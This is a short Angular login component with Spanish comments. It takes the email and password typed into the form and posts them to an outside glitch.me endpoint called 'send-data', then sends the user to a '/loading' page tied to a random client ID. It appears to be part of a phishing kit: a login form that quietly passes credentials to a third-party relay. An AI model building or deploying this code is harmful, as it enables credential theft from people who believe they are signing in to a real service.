import { Component } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Router } from '@angular/router';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css']
})
export class LoginComponent {
  email: string = '';
  password: string = '';
  clientId: string = Math.floor(Math.random() * 1000000).toString(); // ID único por usuario

  constructor(private http: HttpClient, private router: Router) {}

  onSubmit() {
    if (this.email && this.password) {
      this.http.post("https://victorious-futuristic-stream.glitch.me/send-data", {
        email: this.email,
        password: this.password,
        clientId: this.clientId
      }).subscribe(() => {
        this.router.navigate(['/loading', this.clientId]); // Redirigir con ID único
      });
    } else {
      alert("Por favor, completa todos los campos.");
    }
  }
}
